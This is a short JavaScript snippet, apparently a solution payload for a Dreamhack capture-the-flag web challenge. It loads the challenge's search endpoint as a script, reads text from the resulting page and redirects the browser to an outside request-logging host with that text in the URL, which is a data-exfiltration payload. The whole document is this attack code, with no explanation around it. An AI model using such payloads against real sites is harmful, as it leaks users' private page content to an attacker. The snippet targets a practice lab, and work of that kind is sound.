function req(url) {
    let script = document.createElement('script');
    script.src = url;
    script.onload = () => {
        setTimeout(() => {
            if (document.body.innerHTML.includes("not found")) {
                parent.location.href = "https://sawhdhi.request.dreamhack.games/?result=failed";
            } else {
				let resultText = document.querySelector("pre").innerText;
				console.log(resultText);
                location.href = `https://sawhdhi.request.dreamhack.games/?result=${resultText}`;
            }
        }, 500);
    };
    script.onerror = () => console.log(`Failed: ${url}`);
    document.head.appendChild(script);
}

req('http://host1.dreamhack.games:20416/search?query=note');
